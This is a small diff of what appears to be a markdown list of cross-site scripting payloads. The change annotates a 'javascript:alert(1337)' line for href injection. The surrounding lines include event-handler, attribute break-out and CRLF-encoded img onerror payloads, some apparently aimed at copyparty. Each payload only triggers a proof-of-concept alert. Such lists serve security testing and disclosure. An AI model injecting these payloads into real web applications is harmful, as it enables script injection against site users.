@@ -79,7 +79,7 @@ ${alert(1337)}
 <custom-tag onmouseover='alert(1337)'>
 /?x=y'%09onclick='alert(1337)'%09accessKey='x'
 /?'accesskey='x'onclick='alert(1337)
-javascript:alert(1337)
+javascript:alert(1337) (Inject in href attribute)
 y%0D%0A%0D%0A%3Cimg+src%3Dcopyparty+onerror%3Dalert(1337)%3E
 ```
 Here, ```%09``` represents the horizontal tab character and ```%0A``` represents the newline.
